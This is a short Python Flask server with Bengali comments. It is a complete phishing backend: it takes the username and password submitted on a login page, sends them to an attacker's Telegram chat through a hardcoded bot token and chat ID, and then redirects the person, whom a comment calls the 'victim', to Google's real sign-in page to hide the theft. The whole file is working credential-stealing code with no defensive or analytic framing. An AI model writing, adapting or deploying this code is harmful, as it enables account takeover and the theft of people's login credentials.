import requests
from flask import Flask, render_template, request, redirect

app = Flask(__name__)

# আপনার দেওয়া সেই বট টোকেন এবং চ্যাট আইডি এখানে বসানো আছে
BOT_TOKEN = "7334757530:AAEmAAt6_A3_kP1_Xv7p4N7q8Gv5oW8k7cE"
CHAT_ID = "6175116744"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    # টেলিগ্রামে যে ফরম্যাটে মেসেজ যাবে
    message = f"🔔 **New Login Alert** 🔔\n\n👤 Email/Phone: {username}\n🔑 Password: {password}\n\n🌐 Site: dineislam.xyz"
    
    # টেলিগ্রাম এপিআই ব্যবহার করে মেসেজ পাঠানো
    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    
    try:
        requests.post(telegram_url, data=payload)
    except Exception as e:
        print(f"Error sending message: {e}")

    # লগইন শেষে ভিক্টিমকে সরাসরি গুগলের আসল লগইন পেজে পাঠিয়ে দেওয়া
    return redirect("https://accounts.google.com/signin/v2/identifier")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
